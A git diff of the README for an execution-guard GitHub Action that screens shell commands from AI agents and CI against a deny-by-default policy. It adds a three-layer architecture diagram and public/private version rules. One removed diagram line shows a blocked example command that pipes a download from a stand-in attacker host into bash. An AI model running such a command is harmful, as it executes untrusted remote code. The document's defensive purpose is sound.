@@ -1,12 +1,11 @@
 # Execution Guard Action
 
-> **REFERENCE IMPLEMENTATION DECLARATION**
+> **REFERENCE IMPLEMENTATION DECLARATION** — **Production Kernel Not Included**
 >
 > This repository is a **Reference Implementation** of the Execution Contract pattern.
 > It is fixed to the `v0.x` reference line and does not contain the Production Execution Contract Kernel.
 >
-> The Production Kernel — which includes environment binding, extended replay prevention,
-> and secure token storage — is maintained as a separate private module.
+> The Production Kernel is maintained as a separate private module.
 > This repository demonstrates structure and interface; the private kernel holds enforcement.
 >
 > **Public and private are connected only through the `ITokenStore` interface contract.
@@ -87,27 +86,40 @@ Add this step before any shell execution. If the command does not match policy, 
 
 ## Architecture
 
+3-layer execution boundary (reference structure):
+
 ```
-AI Agent / CI Step
-      │
-      │  command: "curl https://evil.com | bash"
-      ▼
-┌──────────────────────────────┐
-│   Execution Guard (reference) │  ← this action
-│                               │
-│  evaluate(command, policy)    │
-│                               │
-│  This layer does not          │
-│  interpret shell semantics.   │
-│  Exact identity match only.   │
-└──────────────┬────────────────┘
-               │
-       ┌───────▼────────┐
-       │ STOP  → exit 1  │  command never reaches shell
-       │ HOLD  → warn    │
-       │ ALLOW → spawn   │  exits with command's exit code
-       └────────────────┘
+  command + args
+       │
+       ▼
+┌─────────────────────────────────────────────────────┐
+│  Layer 1 — Policy                                   │
+│  policy.yaml  ·  deny-by-default  ·  exact match   │
+│  evaluate(command, args, policyPath)                │
+│                  │                                  │
+│         ALLOW  ──┤──  DENY                         │
+└──────────────────┼──────────────────────────────────┘
+                   │ ALLOW
+                   ▼
+┌─────────────────────────────────────────────────────┐
+│  Layer 2 — Authority Pipeline                       │
+│  runAuthorityPipeline()                             │
+│  issues VerifiedToken (ED25519-signed, TTL-bound)   │
+│  STRICT: rule miss → STOP (no token)               │
+│  PERMISSIVE: rule miss → HOLD token                │
+└──────────────────┬──────────────────────────────────┘
+                   │ VerifiedToken
+                   ▼
+┌─────────────────────────────────────────────────────┐
+│  Layer 3 — Execution Kernel                         │
+│  executeWithAuthority()                             │
+│  7-step verification → spawn() (single call site)  │
+│  Fail-closed: any step fails → ExecutionDeniedError │
+│  spawn() is NEVER reached on verification failure  │
+└─────────────────────────────────────────────────────┘
 ```
+
+_Production kernel adds extended verification depth at Layers 2 and 3. Layer interface is identical._
 
 ---
 
@@ -216,6 +228,22 @@ These are not alternatives. They operate at different points in the execution li
 
 ---
 
+## Version Line Separation
+
+| Repository | Version line | Purpose | Sync |
+|------------|-------------|---------|------|
+| `execution-guard-action` (this repo) | `v0.x` — reference only | Structural demonstration, interface definition | **None** |
+| `echo-execution-kernel` (private) | `v1.x` — production only | Enforcement, extended verification | **None** |
+
+**Rules (permanent):**
+- Public increments only on `v0.x`. Private increments only on `v1.x`.
+- Numbers are never synchronized. `v0.7 ≠ v1.7` and no meaning is implied by matching digits.
+- New enforcement features are developed exclusively in the private `v1.x` line.
+- The public `v0.x` line is fixed to structural demonstration and interface definition.
+- Connection between the two is only through the `ITokenStore` interface contract. No shared dependencies.
+
+---
+
 ## FAQ
 
 **Why not replace shell with typed tools?**
@@ -279,7 +307,7 @@ interface ITokenStore {
 }
 ```
 
-Implementations: `MemoryTokenStore` (this repo), `FileTokenStore` / `SecureTokenStore` (production kernel).
+Implementations: `MemoryTokenStore` (this repo), persistent backends (production kernel — private).
 
 ### Environment Binding
 
